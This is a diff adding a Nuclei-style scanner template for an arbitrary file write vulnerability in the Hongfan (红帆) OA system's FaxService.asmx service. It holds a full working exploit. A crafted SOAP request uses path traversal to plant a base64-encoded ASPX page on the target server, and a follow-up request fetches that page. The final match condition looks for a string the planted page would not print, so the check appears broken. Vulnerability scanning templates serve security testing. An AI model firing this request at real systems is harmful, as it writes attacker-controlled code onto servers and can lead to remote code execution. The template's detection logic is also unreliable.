@@ -1,0 +1,43 @@
+id: hongfan-oa-file-write
+
+info:
+  name: "红帆OA系统FaxService.asmx接口任意文件写入漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    红帆OA系统FaxService.asmx组件存在文件写入漏洞，攻击者可通过构造恶意请求在目标服务器上实现任意文件写入操作，可能导致远程代码执行或数据篡改。
+  tags: 红帆
+
+flow: http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /iOffice/prg/set/wss/FaxService.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/SaveConvertTif
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+        <SaveConvertTif xmlns="http://tempuri.org/">
+          <FaxID>1</FaxID>
+          <Pages>2</Pages>
+          <FileName>../../../../NTest.aspx</FileName>
+          <FileContent>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiU+PCUgUmVzcG9uc2UuV3JpdGUoIkR1ZGVTdWl0ZSIpO1N5c3RlbS5JTy5GaWxlLkRlbGV0ZShTZXJ2ZXIuTWFwUGF0aChSZXF1ZXN0LlVybC5BYnNvbHV0ZVBhdGgpKTsgJT4=</FileContent>
+        </SaveConvertTif>
+      </soap:Body>
+    </soap:Envelope>
+- raw:
+  - |
+    GET /iOffice/NTest.aspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'SaveConvertTifResponse'
